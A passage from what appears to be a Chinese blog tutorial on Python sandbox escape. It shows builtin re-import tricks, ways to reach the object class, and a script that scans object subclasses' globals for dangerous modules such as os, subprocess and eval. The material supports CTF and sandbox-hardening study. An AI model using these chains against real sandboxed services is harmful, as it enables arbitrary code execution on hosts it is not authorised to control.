__builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这时可以尝试重新导入<code>内建模块</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure><p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p><h2 id="构造逃逸链"><a href="#构造逃逸链" class="headerlink" title="构造逃逸链"></a>构造逃逸链</h2><p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p><p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code>两个方法，除非显式声明继承自<code>object</code>类。</p><p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p><p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p><p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p><p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p><h3 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h3><p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">object</span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure><h3 id="遍历派生类"><a href="#遍历派生类" class="headerlink" title="遍历派生类"></a>遍历派生类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(object.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                print(<span 